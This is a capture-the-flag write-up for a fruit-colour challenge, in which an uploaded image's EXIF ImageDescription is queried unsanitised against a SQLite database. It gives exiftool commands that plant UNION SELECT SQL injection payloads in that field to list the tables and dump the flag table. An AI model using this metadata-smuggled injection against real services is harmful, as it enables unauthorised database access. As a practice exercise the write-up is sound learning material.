# Fruit Color Query

Author: reyes

> So my friend made a website that identifies the color of the image of the fruit you upload... but he isn't using any kind of smart image reader so the fruit-color pair is probably written into a database somewhere. Maybe try uploading the image attached?

**Difficulty: Easy**

## Solution

As hinted (source not given), we try uploading the attached image, which tells us that the apple is red.

Running exiftool:
```
File Type: JPEG
File Type Extension: jpg
MIME Type: image/jpeg
JFIF Version: 1.01
Resolution Unit: inches
X Resolution: 300
Y Resolutio: 300
Exif Byte Order: Little-endian (Intel, II)
Image Description: apple
Orientation: Horizontal (normal)
Copyright: Dimitris66
Rights: Dimitris66
Asset ID: 185262648
Creator: Dimitris66
Description: Red apple with leaf on white background. Apple portions
```

Suspiciously, Image Description is `apple` and Description contains `apple` and `red`.

By trial and error, only Image Description matters. Setting it to "banana" gives `yellow`.

`exiftool -ImageDescription="a' UNION SELECT name FROM sqlite_master;-- " exploit.jpg`:`flag`

This tells us there is a flag table (fruits table not shown due to `cursor.fetchall()[0][0]`) 

`exiftool -ImageDescription="a' UNION SELECT * FROM flag;-- " exploit.jpg`:`ACSI{sql1_i5_d34d?_1_d0n't_r341ly_Kn0w}`

This challenge may be pretty guessy since:
1. Check exiftool
2. Find which of description, image description, caption actually matter
3. Realise its a sqlite db
4. Find the flag table and realise its one column selected each
